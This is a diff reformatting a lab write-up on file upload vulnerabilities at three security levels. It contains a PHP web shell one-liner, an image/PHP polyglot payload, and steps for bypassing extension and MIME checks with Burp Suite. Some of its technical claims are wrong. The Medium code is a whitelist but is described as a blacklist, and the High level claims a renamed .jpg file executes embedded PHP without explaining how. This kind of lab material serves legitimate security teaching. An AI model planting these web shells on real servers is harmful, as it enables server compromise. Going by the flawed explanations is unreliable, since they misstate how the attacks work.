@@ -1,156 +1,218 @@
-File Upload
+# File Upload
 
-Security Levels: Low | Medium | High
+**Security Levels:** Low | Medium | High
 
-LOW Level
-Why it is Vulnerable
+---
 
-No file type validation
+## LOW Level
 
-No file extension restriction
+### Why it is Vulnerable
 
-No MIME type verification
+* No file type validation
+* No file extension restriction
+* No MIME type verification
+* Upload directory is web‑accessible
+* Executable files allowed
 
-Upload directory is web‑accessible
+---
 
-Executable files allowed
+### Vulnerable Code
 
-Vulnerable Code
+```php
 move_uploaded_file($_FILES['uploaded']['tmp_name'],
 "hackable/uploads/" . $_FILES['uploaded']['name']);
+```
 
-Payloads (PoC)
-PHP Web Shell
+---
+
+### Payloads (PoC)
+
+#### PHP Web Shell
+
+```php
 <?php system($_GET['cmd']); ?>
+```
 
-File Name
+---
+
+#### File Name
+
+```
 shell.php
+```
 
-Exploitation Steps
+---
 
-Upload malicious PHP file
+### Exploitation Steps
 
-Access uploaded file via browser
+* Upload malicious PHP file
+* Access uploaded file via browser
+* Execute system commands
 
-Execute system commands
+---
 
-Result
+### Result
 
-Web shell uploaded successfully
+* Web shell uploaded successfully
+* Remote command execution achieved
 
-Remote command execution achieved
+---
 
-Impact
+### Impact
 
-Remote Code Execution (RCE)
+* Remote Code Execution (RCE)
+* Complete server compromise
+* Data theft and defacement
 
-Complete server compromise
+---
 
-Data theft and defacement
+### Severity: **High**
 
-Severity: High
-MEDIUM Level
-Why it is Vulnerable
+---
 
-File extension blacklist applied
+## MEDIUM Level
 
-MIME type checked via client request
+### Why it is Vulnerable
 
-No server‑side content inspection
+* File extension blacklist applied
+* MIME type checked via client request
+* No server‑side content inspection
+* Bypass possible using double extensions
 
-Bypass possible using double extensions
+---
 
-Code Behavior
+### Code Behavior
+
+```php
 if( in_array($ext, array("jpg","png","gif")) ) {
     move_uploaded_file(...);
 }
+```
 
-Payloads (PoC)
-Double Extension Bypass
+---
+
+### Payloads (PoC)
+
+#### Double Extension Bypass
+
+```
 shell.php.jpg
+```
 
-Content‑Type Bypass
+---
+
+#### Content‑Type Bypass
+
+```http
 Content-Type: image/jpeg
+```
 
-Exploitation Steps
+---
 
-Rename shell with double extension
+### Exploitation Steps
 
-Intercept request using Burp Suite
+* Rename shell with double extension
+* Intercept request using Burp Suite
+* Change Content‑Type header
+* Upload file successfully
 
-Change Content‑Type header
+---
 
-Upload file successfully
+### Result
 
-Result
+* File upload restriction bypassed
+* Shell accessible on server
 
-File upload restriction bypassed
+---
 
-Shell accessible on server
+### Impact
 
-Impact
+* RCE still possible
+* Weak validation logic exposed
 
-RCE still possible
+---
 
-Weak validation logic exposed
+### Severity: **Medium**
 
-Severity: Medium
-HIGH Level
-Why it is Vulnerable
+---
 
-Server‑side validation implemented
+## HIGH Level
 
-File renamed after upload
+### Why it is Vulnerable
 
-Upload path restricted
+* Server‑side validation implemented
+* File renamed after upload
+* Upload path restricted
+* Logic flaw allows PHP execution
 
-Logic flaw allows PHP execution
+---
 
-Vulnerable Logic
+### Vulnerable Logic
+
+```php
 $target_path = "hackable/uploads/" . md5($_FILES['uploaded']['name']) . ".jpg";
 move_uploaded_file($_FILES['uploaded']['tmp_name'], $target_path);
+```
 
-Attack Concept
+---
 
-Execute PHP code inside image file using polyglot payload.
+### Attack Concept
 
-Payloads (PoC)
-Image + PHP Polyglot
+> Execute PHP code inside image file using **polyglot payload**.
+
+---
+
+### Payloads (PoC)
+
+#### Image + PHP Polyglot
+
+```php
 GIF89a
 <?php system($_GET['cmd']); ?>
+```
 
-File Name
+---
+
+### File Name
+
+```
 image.jpg
+```
 
-Exploitation Steps
+---
 
-Embed PHP code inside valid image
+### Exploitation Steps
 
-Upload image file
+* Embed PHP code inside valid image
+* Upload image file
+* Access file via browser
+* Execute command parameter
 
-Access file via browser
+---
 
-Execute command parameter
+### Result
 
-Result
+* Server executes embedded PHP
+* RCE achieved despite protections
 
-Server executes embedded PHP
+---
 
-RCE achieved despite protections
+### Impact
 
-Impact
+* Full application compromise
+* Defense bypass using logic flaw
 
-Full application compromise
+---
 
-Defense bypass using logic flaw
+### Severity: **High**
 
-Severity: High
-Overall Impact Summary
+---
 
-File upload flaws lead to RCE
+## Overall Impact Summary
 
-Blacklist and MIME checks are weak
+* File upload flaws lead to RCE
+* Blacklist and MIME checks are weak
+* Polyglot files bypass validations
+* High risk vulnerability
 
-Polyglot files bypass validations
-
-High risk vulnerability
+---
